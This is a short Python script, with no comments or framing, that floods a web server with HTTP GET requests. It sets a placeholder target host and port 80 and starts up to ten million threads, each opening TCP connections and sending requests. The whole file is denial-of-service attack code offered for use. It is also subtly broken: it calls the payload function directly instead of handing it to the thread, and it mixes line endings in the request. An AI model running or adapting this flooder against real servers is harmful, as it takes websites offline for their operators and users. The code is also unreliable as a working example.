import socket
import threading
import time
start_time = time.time()
target = 'exampllllllle.com'
port = 80
count=2
thr=10000000
agent='Mozila/56'
path='/'
req = "GET %s HTTP/1.1\nUser-Agent: %s\r\nHost: %s\n\n"%(path, agent, target)

def payload():
    for i in range(count):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto((req).encode('utf-8'), (target, port))
       # print(s.recv(4096))
        s.close()
for j in range(thr):
    thread = threading.Thread(target=payload())
    print(thread.name,j)
    thread.start()
print("--- %s seconds ---" % (time.time() - start_time))
